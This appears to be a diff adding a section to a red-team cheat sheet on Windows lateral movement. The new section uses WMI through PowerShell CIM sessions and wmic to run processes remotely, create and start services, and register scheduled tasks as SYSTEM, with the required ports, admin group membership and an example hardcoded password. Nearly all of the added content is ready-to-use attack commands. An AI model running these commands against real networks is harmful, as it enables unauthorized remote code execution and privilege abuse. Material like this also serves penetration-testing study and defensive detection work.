@@ -62,3 +62,71 @@ schtasks /s TARGET /run /TN "TaskName"
 # Kill Schedule task:
 schtasks /S TARGET /TN "TaskName" /DELETE /F
 ```
+
+# 5-Fuckin WMI:
+- **Required**:
+    - **DCOM**: RPC over IP will be used for connecting to WMI. This protocol uses port 135/TCP and ports 49152-65535/TCP
+    - **Wsman**: WinRM will be used for connecting to WMI. This protocol uses ports 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS).
+- provide objects for connecting to WMI:
+```ps1
+$username = 'Administrator';
+$password = 'Mypass123';
+$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
+$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
+$Opt = New-CimSessionOption -Protocol DCOM
+$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop
+```
+### 5.1-Remote Process creation Using WMI:
+- Ports:
+    - 135/TCP, 49152-65535/TCP (DCERPC)
+    - 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
+- Required Group Memberships: Administrators
+- **command**
+```ps1
+$Command = "powershell.exe -Command <command to execute>";
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
+CommandLine = $Command
+}
+# you can also do this
+wmic.exe /user:Administrator /password:Mypass123 /node:TARGET process call create "cmd.exe /c <command to execute>" 
+```
+### 5.2-Creating Services Remotely Using WMI:
+- Ports:
+    - 135/TCP, 49152-65535/TCP (DCERPC)
+    - 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
+- Required Group Memberships: Administrators
+- **command**
+```ps1
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
+Name = "ServiceName";
+DisplayName = "ServiceName";
+PathName = "<command/path to executable>";
+ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
+StartMode = "Manual"
+}
+$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'ServiceName'"
+Invoke-CimMethod -InputObject $Service -MethodName StartService
+
+# to Kill the service:
+Invoke-CimMethod -InputObject $Service -MethodName StopService
+Invoke-CimMethod -InputObject $Service -MethodName Delete
+```
+
+### 5.3-Creating Scheduled Tasks Remotely Using WMI:
+- Ports:
+    - 135/TCP, 49152-65535/TCP (DCERPC)
+    - 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
+- Required Group Memberships: Administrators
+- **command**
+```ps1
+# Payload must be split in Command and Args
+$Command = "cmd.exe"
+$Args = "/c <command>"
+$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
+Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "TaskName"
+Start-ScheduledTask -CimSession $Session -TaskName "TaskName"
+
+# to kill The Task:
+Unregister-ScheduledTask -CimSession $Session -TaskName "TaskName"
+```
+
